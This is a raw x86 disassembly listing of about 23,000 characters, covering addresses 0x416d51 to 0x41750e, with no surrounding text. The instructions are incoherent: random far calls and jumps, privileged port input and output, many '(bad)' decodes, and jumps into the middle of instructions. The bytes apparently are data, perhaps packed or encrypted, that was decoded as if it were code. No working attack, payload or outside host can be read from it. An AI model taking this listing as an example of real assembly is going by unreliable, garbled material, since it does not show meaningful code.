  416d51:	jb     0x416d8a
  416d53:	jbe    0x416db5
  416d55:	mov    al,ds:0x519e8ede
  416d5a:	xlat   BYTE PTR ds:[ebx]
  416d5b:	pop    ss
  416d5c:	push   edi
  416d5d:	mov    ch,0x86
  416d5f:	xchg   BYTE PTR [esi],al
  416d61:	shl    DWORD PTR [edi+0x15fde2f],1
  416d67:	sub    al,0xd
  416d69:	int    0x7b
  416d6b:	adc    BYTE PTR [esi],0xb6
  416d6e:	mov    ds:0x15919162,eax
  416d73:	add    esi,edi
  416d75:	icebp  
  416d76:	sahf   
  416d77:	lods   al,BYTE PTR ds:[esi]
  416d78:	push   esp
  416d79:	aam    0xe7
  416d7b:	mov    cl,0xb6
  416d7d:	je     0x416d50
  416d7f:	cmp    dl,ah
  416d81:	mov    BYTE PTR [esi+0x4bc4601d],dh
  416d87:	into   
  416d88:	and    DWORD PTR [edi-0x10],0x3fdb4159
  416d8f:	mov    BYTE PTR [ecx],al
  416d91:	push   ecx
  416d92:	in     eax,0x7d
  416d94:	out    0x64,eax
  416d96:	sub    BYTE PTR [ebx+0xa861ec0],0xca
  416d9d:	and    al,0x70
  416d9f:	sub    ch,BYTE PTR gs:[ecx+edx*2-0x38]
  416da4:	cmp    edx,esp
  416da6:	pop    esi
  416da7:	mov    ch,0x48
  416da9:	adc    eax,0x55c1f5c1
  416dae:	aad    0xc4
  416db0:	fdivr  DWORD PTR [ebx]
  416db2:	fldenv [eax-0x74dae5f6]
  416db8:	push   ecx
  416db9:	add    DWORD PTR [edx+0x6a],0x7b49693a
  416dc0:	ja     0x416d7f
  416dc2:	sub    esi,DWORD PTR ds:0xbc3dc20a
  416dc8:	shr    DWORD PTR [edi-0x39],cl
  416dcb:	fstp   st(7)
  416dcd:	bound  esp,QWORD PTR [edi+0xb2e769e]
  416dd3:	outs   dx,DWORD PTR ds:[esi]
  416dd4:	adc    bl,bl
  416dd6:	xlat   BYTE PTR ds:[ebx]
  416dd7:	lock jns 0x416e11
  416dda:	push   esi
  416ddb:	push   0x84be56a7
  416de0:	fdiv   QWORD PTR [esi]
  416de2:	jns    0x416da6
  416de4:	and    BYTE PTR [eax-0x26342e08],bl
  416dea:	cmp    eax,0xf6364441
  416def:	sub    al,0xb6
  416df1:	pop    ecx
  416df2:	and    dh,BYTE PTR [edi+0x70f4a5d0]
  416df8:	mov    esp,fs
  416dfa:	sbb    BYTE PTR [ebp-0x26e59b95],0x1a
  416e01:	sbb    edi,DWORD PTR [edi]
  416e03:	retf   
  416e04:	or     esi,ebp
  416e06:	loope  0x416e08
  416e08:	and    BYTE PTR [ecx],al
  416e0a:	adc    esp,ebp
  416e0c:	dec    esi
  416e0d:	bswap  eax
  416e0f:	outs   dx,BYTE PTR ds:[esi]
  416e10:	ret    
  416e11:	cmp    edx,DWORD PTR [esp+edi*2+0xb4f87f8]
  416e18:	xchg   ebp,eax
  416e19:	xor    BYTE PTR [edi+edx*2],dl
  416e1c:	pusha  
  416e1d:	or     ebx,DWORD PTR [ecx-0x5402fa23]
  416e23:	call   0xd6ec:0x40fa13d3
  416e2a:	mov    dh,0xcd
  416e2c:	ror    BYTE PTR [ecx+0x50],1
  416e2f:	ja     0x416e80
  416e31:	sub    DWORD PTR [edi],0x71
  416e34:	lds    ecx,FWORD PTR [edx]
  416e36:	icebp  
  416e37:	je     0x416e7c
  416e39:	test   BYTE PTR [ecx],dl
  416e3b:	xchg   dh,ah
  416e3d:	ins    BYTE PTR es:[edi],dx
  416e3e:	loop   0x416e79
  416e40:	popa   
  416e41:	int    0x6f
  416e43:	xlat   BYTE PTR ds:[ebx]
  416e44:	popa   
  416e45:	cmp    bl,BYTE PTR [ecx]
  416e47:	nop
  416e48:	adc    eax,DWORD PTR [ebx]
  416e4a:	out    0x1c,eax
  416e4c:	mov    esp,0x7ba814dc
  416e51:	mov    ecx,ecx
  416e53:	popf   
  416e54:	loope  0x416eb5
  416e56:	xor    edi,edi
  416e58:	cmovg  edi,DWORD PTR [ebp-0x3052962f]
  416e5f:	or     edi,DWORD PTR [eax+0x6c0052d]
  416e65:	add    DWORD PTR [ebx+0x638233f8],0x14
  416e6c:	leave  
  416e6d:	rol    BYTE PTR [eax],1
  416e6f:	mov    cl,0x98
  416e71:	xchg   edi,eax
  416e72:	data16 xlat BYTE PTR ds:[ebx]
  416e74:	cmp    eax,0x7fa53ff7
  416e79:	fcomp  DWORD PTR [edx-0x6d]
  416e7c:	test   BYTE PTR [edi+0x18],bh
  416e7f:	out    dx,eax
  416e80:	pop    eax
  416e81:	jne    0x416e0b
  416e83:	xor    eax,0xb32eb435
  416e88:	jle    0x416ea5
  416e8a:	dec    eax
  416e8b:	out    dx,eax
  416e8c:	ss xchg ebp,eax
  416e8e:	arpl   WORD PTR [edi+edx*1+0x1a],bp
  416e92:	fsub   QWORD PTR [ebp+ebp*8-0x1fa4b169]
  416e99:	jae    0x416e9b
  416e9b:	outs   dx,BYTE PTR ds:[esi]
  416e9c:	sbb    DWORD PTR [esi+edi*1+0x6],ecx
  416ea0:	mov    edx,ss
  416ea2:	mov    dl,0xb1
  416ea4:	jb     0x416e49
  416ea6:	js     0x416f1f
  416ea8:	mov    dl,0x5a
  416eaa:	cmp    edx,DWORD PTR [eax+0x16]
  416ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eae:	mov    dh,0x81
  416eb0:	hlt    
  416eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eb2:	ja     0x416e3b
  416eb4:	pop    edx
  416eb5:	push   0x20
  416eb7:	mov    bh,0xd5
  416eb9:	mov    eax,0x8e71d57b
  416ebe:	fild   QWORD PTR [edx]
  416ec0:	ss dec esp
  416ec2:	fdiv   QWORD PTR [edx+0x61]
  416ec5:	addr16 pop ebx
  416ec7:	xchg   esi,eax
  416ec8:	loop   0x416f03
  416eca:	aas    
  416ecb:	cdq    
  416ecc:	sbb    BYTE PTR [ebp-0x46],bh
  416ecf:	inc    eax
  416ed0:	xor    bl,0x71
  416ed3:	sub    edi,DWORD PTR [esi-0x1e6e3ddf]
  416ed9:	das    
  416eda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416edb:	jmp    0x416ed8
  416edd:	dec    eax
  416ede:	lods   al,BYTE PTR ds:[esi]
  416edf:	out    0xad,al
  416ee1:	adc    DWORD PTR [ecx+0x60],esi
  416ee4:	jg     0x416e8b
  416ee6:	rcr    DWORD PTR [eax+0x7e9552b6],0x77
  416eed:	pop    esp
  416eee:	out    0x6d,al
  416ef0:	and    eax,0xc3895051
  416ef5:	adc    ch,0xdd
  416ef8:	xor    ah,BYTE PTR [edx]
  416efa:	(bad)  
  416efb:	(bad)  
  416efc:	call   0xc9a1:0xecd623c
  416f03:	push   ss
  416f04:	data16 adc bh,BYTE PTR [eax+eiz*8-0x31]
  416f09:	enter  0x4601,0x70
  416f0d:	arpl   cx,di
  416f0f:	adc    edx,edx
  416f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f12:	or     eax,0x9d604839
  416f17:	not    DWORD PTR [eax]
  416f19:	sti    
  416f1a:	or     eax,0xe0ad17af
  416f1f:	sub    dh,dl
  416f21:	pop    ebp
  416f22:	jecxz  0x416eb8
  416f24:	inc    esp
  416f25:	aas    
  416f26:	xlat   BYTE PTR ds:[ebx]
  416f27:	repnz popf 
  416f29:	call   0xdfd0:0xea0a089a
  416f30:	dec    esp
  416f31:	rcl    BYTE PTR [ebx],1
  416f33:	jno    0x416f8b
  416f35:	outs   dx,BYTE PTR ds:[esi]
  416f36:	jns    0x416ec9
  416f38:	inc    esi
  416f39:	repz inc esi
  416f3b:	es dec eax
  416f3d:	nop    DWORD PTR [ebx]
  416f40:	popa   
  416f41:	daa    
  416f42:	fnop   
  416f44:	xor    eax,0x2f7309d9
  416f4a:	xchg   edi,eax
  416f4b:	jmp    0xbc53b9e8
  416f50:	xchg   BYTE PTR [ebx-0x7e],cl
  416f53:	pop    esi
  416f54:	pushf  
  416f55:	jmp    DWORD PTR [edi-0x69eac21d]
  416f5b:	cmp    eax,0x71cc2a2d
  416f60:	int3   
  416f61:	sub    esp,DWORD PTR [ebx-0x312ad937]
  416f67:	mov    cl,0x6c
  416f69:	aas    
  416f6a:	sahf   
  416f6b:	in     eax,0x70
  416f6d:	ins    DWORD PTR es:[edi],dx
  416f6e:	and    eax,0xc9e2007d
  416f73:	retf   0x80b
  416f76:	fincstp 
  416f78:	aad    0xbf
  416f7a:	je     0x416f12
  416f7c:	aam    0x9c
  416f7e:	mov    BYTE PTR [ecx],bl
  416f80:	and    ebp,ebx
  416f82:	mov    DWORD PTR [edx-0x13d526fe],ebx
  416f88:	push   edi
  416f89:	fsubp  st(7),st
  416f8b:	sub    edx,ecx
  416f8d:	(bad)  
  416f8e:	push   esp
  416f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f90:	(bad)  
  416f91:	cwde   
  416f92:	jae    0x416f72
  416f94:	add    eax,0x49c0d2
  416f99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f9a:	mov    edx,0x2eb61d87
  416f9f:	imul   DWORD PTR [edx-0x2]
  416fa2:	or     eax,0x1b455790
  416fa7:	retf   0x566a
  416faa:	mov    bl,0x2e
  416fac:	jmp    0x2e48d326
  416fb1:	mov    edi,0x8af31d56
  416fb6:	ss ja  0x416f39
  416fb9:	adc    al,0x1f
  416fbb:	sbb    bh,BYTE PTR [edx-0x76]
  416fbe:	push   cs
  416fbf:	loope  0x416fa3
  416fc1:	es out dx,al
  416fc3:	ret    0x9378
  416fc6:	pop    ebp
  416fc7:	fcom   DWORD PTR [esi+ecx*4+0x26]
  416fcb:	cld    
  416fcc:	and    ch,dh
  416fce:	imul   ebp,DWORD PTR [ebx],0x64e67961
  416fd4:	in     al,0xe7
  416fd6:	(bad)  
  416fd7:	and    BYTE PTR [eax-0x55a9b676],bl
  416fdd:	jle    0x417007
  416fdf:	mov    eax,ds:0x463da626
  416fe4:	fiadd  DWORD PTR [esi+0x483fa84b]
  416fea:	inc    ebx
  416feb:	adc    al,0x8b
  416fed:	repnz sub ah,0x1c
  416ff1:	es inc bh
  416ff4:	fs stc 
  416ff6:	dec    ebx
  416ff7:	pop    edx
  416ff8:	push   es
  416ff9:	lods   al,BYTE PTR ds:[esi]
  416ffa:	mov    al,BYTE PTR [ecx+0x7b]
  416ffd:	or     BYTE PTR [esi],cl
  416fff:	call   0x3218:0xc7eeded8
  417006:	inc    eax
  417007:	ret    
  417008:	clc    
  417009:	mov    ds:0x1d10bb62,al
  41700e:	pop    es
  41700f:	push   esi
  417010:	inc    ebx
  417011:	mov    ecx,0x27b4fc4
  417016:	pop    eax
  417017:	into   
  417018:	sub    eax,0x96114e5a
  41701d:	lock xor al,0x7c
  417020:	leave  
  417021:	aas    
  417022:	cld    
  417023:	push   es
  417024:	push   ebx
  417025:	adc    al,0x6f
  417027:	call   0x9ddd9830
  41702c:	test   al,0x4b
  41702e:	inc    ebp
  41702f:	dec    ebx
  417030:	and    ch,BYTE PTR [ebx-0x451f8ce6]
  417036:	aam    0x72
  417038:	and    al,0x91
  41703a:	xlat   BYTE PTR ds:[ebx]
  41703b:	popa   
  41703c:	or     BYTE PTR [ebp-0x7f1bd63f],al
  417042:	cmp    dl,BYTE PTR [ecx-0x36]
  417045:	jecxz  0x417045
  417047:	mov    dh,BYTE PTR [edx]
  417049:	push   cs
  41704a:	inc    esi
  41704b:	dec    esp
  41704c:	mov    ds:0x561dd0ae,eax
  417051:	mov    al,0xab
  417053:	rol    BYTE PTR [ecx],cl
  417055:	repz push edi
  417057:	jo     0x417043
  417059:	iret   
  41705a:	nop
  41705b:	repz popa 
  41705d:	xor    BYTE PTR [esi],0xda
  417060:	cmc    
  417061:	push   edi
  417062:	inc    eax
  417063:	xor    BYTE PTR [esi],ah
  417065:	or     al,0xe
  417067:	jns    0x4170ac
  417069:	push   0x12
  41706b:	loop   0x4170cc
  41706d:	cli    
  41706e:	mov    esi,0x3ddc0733
  417073:	mov    al,ds:0x6c61119b
  417078:	inc    esp
  417079:	lods   al,BYTE PTR ds:[esi]
  41707a:	test   DWORD PTR [ebx+edx*1-0x6691ea53],edi
  417081:	lock outs dx,DWORD PTR ds:[esi]
  417083:	fldcw  WORD PTR [edi+0x78a1a7e9]
  417089:	(bad)  
  41708a:	dec    ebx
  41708b:	mov    al,ds:0xfb978ed8
  417090:	and    DWORD PTR [ecx],esi
  417092:	and    bh,bh
  417094:	lock xchg ebx,eax
  417096:	fmul   st,st(5)
  417098:	lods   al,BYTE PTR ds:[esi]
  417099:	out    dx,al
  41709a:	add    al,0xb1
  41709c:	mov    BYTE PTR [ebx],al
  41709e:	and    esi,esp
  4170a0:	mov    ebx,0x5da9ddd7
  4170a5:	aad    0x1b
  4170a7:	mov    bh,0xdd
  4170a9:	or     al,0xab
  4170ab:	add    DWORD PTR [ebx+0x593a8b16],0xf5b2116a
  4170b5:	and    DWORD PTR [ebp-0x63],0x56
  4170b9:	and    BYTE PTR ds:[esi+0x10],0x63
  4170be:	mov    al,0x1d
  4170c0:	and    DWORD PTR [esi+0x32],edi
  4170c3:	xchg   edx,eax
  4170c4:	pop    esi
  4170c5:	mov    eax,ds:0x1b4e58c5
  4170ca:	pop    es
  4170cb:	fmul   DWORD PTR [esi]
  4170cd:	les    esi,FWORD PTR [edx]
  4170cf:	add    al,0xe4
  4170d1:	cmp    DWORD PTR [ebp+0x53],eax
  4170d4:	mov    ecx,0xa49988d1
  4170d9:	das    
  4170da:	ret    0x2cae
  4170dd:	imul   ebx,DWORD PTR [bx+di],0x40
  4170e1:	enter  0xf0d3,0x3a
  4170e5:	leave  
  4170e6:	fsubr  st(7),st
  4170e8:	xor    edx,DWORD PTR [edi-0x67]
  4170eb:	ins    DWORD PTR es:[edi],dx
  4170ec:	sbb    BYTE PTR ds:0x8a93f2d3,bh
  4170f2:	call   0xce1d6264
  4170f7:	xor    ebx,eax
  4170f9:	sti    
  4170fa:	scas   eax,DWORD PTR es:[di]
  4170fc:	xor    ecx,DWORD PTR [ebx-0x5d213084]
  417102:	or     BYTE PTR [edi+0x712de23b],bl
  417108:	pop    edx
  417109:	fiadd  WORD PTR [edi]
  41710b:	loop   0x41709c
  41710d:	in     eax,0x6e
  41710f:	and    al,0x48
  417111:	xchg   eax,ebx
  417113:	jb     0x417124
  417115:	popa   
  417116:	sub    edi,ecx
  417118:	mov    cl,0x5c
  41711a:	adc    DWORD PTR ds:0x2f150afe,edx
  417120:	mov    ah,0xfd
  417122:	aaa    
  417123:	int3   
  417124:	ja     0x41717c
  417126:	jp     0x41710d
  417128:	or     eax,0xa92e2190
  41712d:	cs adc eax,0x8c7b2d72
  417133:	mov    edx,0xd6ca5260
  417138:	dec    eax
  417139:	cmp    eax,DWORD PTR [ecx]
  41713b:	jp     0x417131
  41713d:	sti    
  41713e:	add    BYTE PTR [ecx],al
  417140:	dec    eax
  417141:	outs   dx,BYTE PTR ds:[esi]
  417142:	push   edi
  417143:	lods   eax,DWORD PTR ds:[esi]
  417144:	sub    DWORD PTR [edx+ebx*1+0x13],esp
  417148:	sbb    eax,0x470e156f
  41714d:	push   ebx
  41714e:	jge    0x4171cc
  417150:	(bad)  
  417151:	dec    edi
  417152:	ret    
  417153:	and    eax,edi
  417155:	ds cmp al,0xc4
  417158:	xor    DWORD PTR [ebp+edi*4-0x70a9befd],ebx
  41715f:	sti    
  417160:	jnp    0x4170ff
  417162:	inc    eax
  417163:	and    ebp,DWORD PTR [eax+0x1]
  417166:	fsubr  DWORD PTR [ebx]
  417168:	xchg   ebp,eax
  417169:	xlat   BYTE PTR ds:[ebx]
  41716a:	sub    BYTE PTR [ecx+0x50],dh
  41716d:	jnp    0x417196
  41716f:	and    DWORD PTR [edi],ecx
  417171:	adc    eax,0x94eda35e
  417176:	call   0x9c48db7e
  41717b:	rol    dh,0x8c
  41717e:	retf   0x5b94
  417181:	sub    DWORD PTR [ecx-0x7f],ecx
  417184:	out    dx,eax
  417185:	loope  0x417143
  417187:	lahf   
  417188:	mov    bl,0x58
  41718a:	pop    esp
  41718b:	lock jo 0x417194
  41718e:	mov    cl,BYTE PTR ds:0xa76162a4
  417194:	enter  0x8261,0x7b
  417198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417199:	in     eax,0x77
  41719b:	data16 add BYTE PTR [edx+0x5d],ah
  41719f:	in     eax,0x56
  4171a1:	jmp    FWORD PTR [edx]
  4171a3:	xchg   ax,ax
  4171a5:	sbb    dh,BYTE PTR [edx-0x31]
  4171a8:	add    esi,edi
  4171aa:	or     ebp,DWORD PTR [esi]
  4171ac:	jbe    0x41715b
  4171ae:	sti    
  4171af:	sbb    eax,0x9d09b003
  4171b4:	aad    0xc
  4171b6:	pop    ecx
  4171b7:	je     0x4171dc
  4171b9:	dec    esi
  4171ba:	fdiv   st,st(7)
  4171bc:	ins    DWORD PTR es:[edi],dx
  4171bd:	lds    ebp,FWORD PTR [esi]
  4171bf:	fstp   QWORD PTR [di-0x29]
  4171c3:	outs   dx,DWORD PTR ds:[esi]
  4171c4:	mov    cl,0x93
  4171c6:	adc    BYTE PTR [ebp-0x27],ch
  4171c9:	xchg   esp,eax
  4171ca:	fnstsw WORD PTR [ebx+eiz*2-0x69384ae6]
  4171d1:	ss dec ebp
  4171d3:	dec    ecx
  4171d4:	dec    esi
  4171d5:	xlat   BYTE PTR ds:[ebx]
  4171d6:	out    dx,al
  4171d7:	lods   eax,DWORD PTR ds:[esi]
  4171d8:	add    al,0xc0
  4171da:	mov    ah,0x74
  4171dc:	dec    ebp
  4171dd:	das    
  4171de:	out    dx,eax
  4171df:	mov    WORD PTR [ecx-0x717f4ff8],?
  4171e5:	sar    DWORD PTR [ecx],1
  4171e7:	jmp    0xfa2:0x65c4a056
  4171ee:	cwde   
  4171ef:	inc    esi
  4171f0:	imul   esi,DWORD PTR [edi+0x26],0xffffffec
  4171f4:	int3   
  4171f5:	fmul   st(6),st
  4171f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171f8:	sahf   
  4171f9:	mov    edx,0x79c51854
  4171fe:	mov    al,0xd9
  417200:	rcl    DWORD PTR [ecx-0x1c],cl
  417203:	and    DWORD PTR [esi-0x35],ebx
  417206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417207:	mov    ch,0xbf
  417209:	sbb    DWORD PTR [ebx-0x14f68358],esp
  41720f:	je     0x417228
  417211:	cmp    al,cl
  417213:	jecxz  0x4171b3
  417215:	pop    esp
  417216:	sbb    al,0x5a
  417218:	jmp    0x41719f
  41721a:	cmp    al,0x98
  41721c:	xlat   BYTE PTR ds:[ebx]
  41721d:	cs out dx,al
  41721f:	test   al,0xcb
  417221:	cmp    ecx,DWORD PTR [edi-0x51]
  417224:	mov    edi,0xe927e394
  417229:	call   0x5740:0x4de79844
  417230:	aam    0xf5
  417232:	xchg   BYTE PTR gs:[ebp+ebp*2+0x3b0bf5eb],dh
  41723a:	into   
  41723b:	push   edx
  41723c:	(bad)  
  41723d:	shr    BYTE PTR [edx+0xc],cl
  417240:	outs   dx,BYTE PTR ds:[esi]
  417241:	push   ebp
  417242:	add    BYTE PTR [esi+0x59],bh
  417245:	in     eax,0xcf
  417247:	adc    bh,BYTE PTR [ecx+0x1]
  41724a:	inc    edx
  41724b:	pop    edx
  41724c:	ss sbb eax,0xbdc7c443
  417252:	xchg   esp,eax
  417253:	push   0x1c78e748
  417258:	sbb    esp,DWORD PTR [edx-0x768cf3af]
  41725e:	xchg   BYTE PTR [ecx-0x72],ch
  417261:	or     DWORD PTR [ebp-0x5e018692],0xc37c6adb
  41726b:	lock push ecx
  41726d:	pop    ebp
  41726e:	(bad)  
  41726f:	in     al,dx
  417270:	add    DWORD PTR [ebp+0x3c],edi
  417273:	xchg   ebx,eax
  417274:	adc    al,0x3
  417276:	fmul   QWORD PTR [edx-0x47]
  417279:	jne    0x417266
  41727b:	lds    eax,FWORD PTR [eax+0x1]
  41727e:	out    dx,al
  41727f:	dec    edx
  417280:	mov    al,0x7
  417282:	stc    
  417283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417284:	das    
  417285:	cmp    DWORD PTR [edx-0x28],esi
  417288:	cdq    
  417289:	xchg   edi,eax
  41728a:	pop    ds
  41728b:	into   
  41728c:	push   es
  41728d:	inc    edi
  41728e:	mov    edx,0x9543b858
  417293:	add    edi,DWORD PTR ds:0xa4af1cdf
  417299:	(bad)  
  41729a:	outs   dx,DWORD PTR ds:[esi]
  41729b:	sbb    BYTE PTR [ebp+0x40],cl
  41729e:	repz mov ds:0x66e23571,eax
  4172a4:	or     al,0x4c
  4172a6:	dec    ecx
  4172a7:	mov    cl,0x77
  4172a9:	leave  
  4172aa:	test   al,0x8e
  4172ac:	mov    WORD PTR [ebp+0x6840e45f],cs
  4172b2:	mov    ah,BYTE PTR [ecx+0x3d]
  4172b5:	imul   ebx,ebx,0x5d
  4172b8:	ret    
  4172b9:	cwde   
  4172ba:	aam    0x2
  4172bc:	push   0xffffffcb
  4172be:	jmp    0x4172cb
  4172c0:	shl    BYTE PTR [edx+0x62129ce7],0xb2
  4172c7:	sbb    esi,DWORD PTR [ebx+edx*1+0xc]
  4172cb:	arpl   WORD PTR [ebx+ecx*4+0x51],cx
  4172cf:	cld    
  4172d0:	call   0x81ce0fa7
  4172d5:	retfw  
  4172d7:	dec    esi
  4172d8:	lahf   
  4172d9:	aam    0xec
  4172db:	xor    DWORD PTR [edi],ecx
  4172dd:	mov    ?,WORD PTR ds:0xe2d221b1
  4172e3:	push   ebp
  4172e4:	das    
  4172e5:	inc    esp
  4172e6:	sub    BYTE PTR ds:0x42ed09f0,ch
  4172ec:	xchg   esi,eax
  4172ed:	pop    ebp
  4172ee:	test   BYTE PTR ss:[ecx-0x347eaf88],cl
  4172f5:	mov    ebx,0xb309bbd
  4172fa:	or     dh,BYTE PTR [esi+0x6ce85fda]
  417300:	jge    0x41732b
  417302:	cdq    
  417303:	or     bl,BYTE PTR [ebx]
  417305:	add    esp,DWORD PTR [esp+edx*1]
  417308:	and    al,0xbc
  41730a:	cdq    
  41730b:	or     eax,0xa1c8d101
  417310:	jb     0x417305
  417312:	pusha  
  417313:	nop
  417314:	jnp    0x417339
  417316:	cmp    BYTE PTR [ebx],ah
  417318:	int3   
  417319:	cmp    dh,al
  41731b:	pop    ebx
  41731c:	test   al,bh
  41731e:	mov    esp,0xeaf75d77
  417323:	hlt    
  417324:	xor    DWORD PTR [edi+0x59],0x3a
  417328:	push   edi
  417329:	test   BYTE PTR [edx+0x5f4cbb61],0xd8
  417330:	pop    ebx
  417331:	sahf   
  417332:	pop    edi
  417333:	sub    eax,0x56b9481a
  417338:	mov    ch,0xf1
  41733a:	xchg   ecx,esi
  41733c:	lahf   
  41733d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41733e:	cld    
  41733f:	add    al,0x41
  417341:	pop    esp
  417342:	fcmovne st,st(6)
  417344:	ja     0x417311
  417346:	imul   edx,DWORD PTR [edi],0x5
  417349:	mov    ebx,0x944d86f2
  41734e:	inc    eax
  41734f:	stos   DWORD PTR es:[edi],eax
  417350:	xor    DWORD PTR [ecx-0x324d195e],0x8f48b701
  41735a:	or     al,cl
  41735c:	cmp    DWORD PTR [esi-0x1b8a1c4],edx
  417362:	cmp    al,0x15
  417364:	into   
  417365:	(bad)  
  417366:	fnstsw WORD PTR [eax-0x37]
  417369:	lods   al,BYTE PTR ds:[esi]
  41736a:	fwait
  41736b:	dec    edi
  41736c:	lods   eax,DWORD PTR ds:[esi]
  41736d:	ret    0x9792
  417370:	(bad)  
  417372:	dec    esp
  417373:	mov    esp,0x1cf82052
  417378:	pop    ecx
  417379:	fsubr  st,st(0)
  41737b:	jnp    0x417303
  41737d:	std    
  41737e:	icebp  
  41737f:	push   ecx
  417380:	sar    ebp,1
  417382:	jnp    0x4173be
  417384:	das    
  417385:	jnp    0x41739f
  417387:	out    0x4d,eax
  417389:	or     BYTE PTR [ebx-0x4f7da9f6],bl
  41738f:	push   es
  417390:	repnz mov bl,0x7f
  417393:	cmp    DWORD PTR [eax],esi
  417395:	push   es
  417396:	dec    ebx
  417397:	nop
  417398:	test   DWORD PTR [edx+ecx*1-0x32],ecx
  41739c:	fdiv   st(4),st
  41739e:	and    edx,DWORD PTR [edi+0x1bb8102]
  4173a4:	xchg   DWORD PTR [edx-0x15],esi
  4173a7:	dec    eax
  4173a8:	sub    BYTE PTR [eax],0xdf
  4173ab:	imul   esp,DWORD PTR fs:[ecx+edx*1+0x62],0xb6c17937
  4173b4:	sbb    BYTE PTR [edx-0x94bb296],bh
  4173ba:	lods   al,BYTE PTR ds:[esi]
  4173bb:	mov    ds:0xbd00a85e,eax
  4173c0:	push   edx
  4173c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173c2:	dec    edx
  4173c3:	dec    esp
  4173c4:	aam    0xa5
  4173c6:	popa   
  4173c7:	call   FWORD PTR [esi-0x42]
  4173ca:	in     al,dx
  4173cb:	mov    WORD PTR [eax-0x2076e06b],?
  4173d1:	imul   ebp,DWORD PTR [ecx+0x46ffddf6],0x15
  4173d8:	fs pusha 
  4173da:	ins    DWORD PTR es:[edi],dx
  4173db:	fcom   QWORD PTR [esi-0x56]
  4173de:	sbb    DWORD PTR [edi+0x3a72c9b8],0xffffffe6
  4173e5:	rol    al,0x90
  4173e8:	adc    bl,ah
  4173ea:	sbb    esp,DWORD PTR [ebp-0x77]
  4173ed:	or     BYTE PTR [esi+0x3e24ccb],ch
  4173f3:	sar    DWORD PTR [ecx+0x7d],1
  4173f6:	push   esi
  4173f7:	pop    esp
  4173f8:	xor    DWORD PTR [ebx-0x19acbfb1],esi
  4173fe:	xor    al,0x9b
  417400:	test   al,0x8
  417402:	pop    eax
  417403:	inc    esp
  417404:	(bad)  
  417405:	xchg   esp,eax
  417406:	(bad)  
  417407:	dec    ebx
  417408:	mov    ch,0xee
  41740a:	aas    
  41740b:	and    al,0x7d
  41740d:	xor    edi,DWORD PTR ds:0x3f53d178
  417413:	pop    ecx
  417414:	sar    DWORD PTR [ecx+0x367bd914],cl
  41741a:	and    eax,0x1450fe8c
  41741f:	add    eax,0x3c735dce
  417424:	call   0xddfbfba4
  417429:	or     al,0xa5
  41742b:	jne    0x4173c1
  41742d:	shl    DWORD PTR [eax-0x46353e4],1
  417433:	cld    
  417434:	cmp    edi,DWORD PTR ds:0x4001a85b
  41743a:	imul   ebx,DWORD PTR [ebx],0xe33c63f0
  417440:	cmc    
  417441:	mul    BYTE PTR [eax+0x4d]
  417444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417445:	stc    
  417446:	mov    DWORD PTR [ecx-0x5eedcc8d],ebp
  41744c:	call   0x8376:0xcc4f97fa
  417453:	or     DWORD PTR [eax+0x35],eax
  417456:	test   BYTE PTR ds:0xe17df29a,dl
  41745c:	mov    al,0xcd
  41745e:	xchg   dl,al
  417460:	push   edi
  417461:	inc    edx
  417462:	xlat   BYTE PTR ds:[ebx]
  417463:	xchg   edi,eax
  417464:	aad    0x2a
  417466:	jmp    0x4711d3e3
  41746b:	call   0xd5d02508
  417470:	and    al,BYTE PTR ds:0x1b620975
  417476:	aad    0xd6
  417478:	sahf   
  417479:	jnp    0x41743b
  41747b:	cmp    eax,0xe93da34c
  417480:	aam    0x30
  417482:	arpl   WORD PTR [esi+eiz*8-0x65e9eafa],cx
  417489:	and    edx,DWORD PTR [ecx-0x1ccf3eef]
  41748f:	rol    DWORD PTR [esi],0xc7
  417492:	and    ecx,edx
  417494:	inc    ebp
  417495:	push   ebp
  417496:	jne    0x41745b
  417498:	cli    
  417499:	ret    0xaae6
  41749c:	jl     0x417510
  41749e:	jg     0x4174ee
  4174a0:	xor    eax,0x4930aee5
  4174a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174a6:	adc    DWORD PTR [edx+0x3d],0xa70c730f
  4174ad:	xor    BYTE PTR [edi],ch
  4174af:	xor    eax,0xe2519ac6
  4174b4:	push   ebp
  4174b5:	jge    0x417447
  4174b7:	enter  0x4d3f,0xa2
  4174bb:	stos   DWORD PTR es:[edi],eax
  4174bc:	add    eax,DWORD PTR [edx]
  4174be:	into   
  4174bf:	ror    BYTE PTR [ecx-0x27],cl
  4174c2:	push   ss
  4174c3:	or     BYTE PTR [edi+0xa],0x72
  4174c7:	ffree  st(2)
  4174c9:	stos   BYTE PTR es:[edi],al
  4174ca:	out    dx,al
  4174cb:	int    0x76
  4174cd:	lds    edx,FWORD PTR [edx+0x67adccab]
  4174d3:	cmc    
  4174d4:	outs   dx,DWORD PTR ds:[esi]
  4174d5:	fbstp  TBYTE PTR [edi+0x6c]
  4174d8:	xchg   ebp,eax
  4174d9:	popa   
  4174da:	mov    ebp,0x51f8b8a9
  4174df:	cmp    eax,0x63bd7992
  4174e4:	pusha  
  4174e5:	mov    edi,DWORD PTR [ebx]
  4174e7:	xor    DWORD PTR [edx],0x35
  4174ea:	jle    0x41755c
  4174ec:	mov    bh,0x59
  4174ee:	dec    edi
  4174ef:	mov    al,0x3e
  4174f1:	in     al,dx
  4174f2:	popf   
  4174f3:	(bad)  
  4174f4:	lahf   
  4174f5:	push   esi
  4174f6:	push   edx
  4174f7:	inc    edi
  4174f8:	jnp    0x4174e3
  4174fa:	sub    al,0x53
  4174fc:	out    0xf5,eax
  4174fe:	and    ebp,DWORD PTR [edx+0x5a4ff733]
  417504:	(bad)  
  417506:	pop    ds
  417507:	std    
  417508:	aam    0xeb
  41750a:	jmp    0x4174b1
  41750c:	jl     0x417517
  41750e:	xor    edi,DWORD PTR [edx+0x3cb871c]
